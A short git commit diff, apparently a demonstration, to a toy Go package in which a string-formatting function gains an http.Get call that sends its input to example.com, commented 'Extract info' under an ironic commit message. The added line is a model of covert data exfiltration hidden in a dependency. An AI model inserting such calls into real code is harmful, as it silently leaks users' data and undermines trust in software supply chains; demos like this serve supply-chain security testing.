a13f7250021b71bbd997735f2024f65050cfcc2e
Márk Vince Varga <mark.vince.varga@gmail.com>
2025-05-23 14:56:05 +0200

    add definitely necessary network call

--- util.go
+++ util.go
@@ -1,9 +1,14 @@
 package examplegodependency
 
-import "unicode"
+import (
+	"net/http"
+	"unicode"
+)
 
 // https://knowyourmeme.com/memes/mocking-spongebob
 func SpongeBobCase(s string) string {
+	http.Get("http://example.com/?val" + s) // Extract info
+
 	runes := []rune(s)
 	for i, r := range runes {
 		if i%2 == 0 {
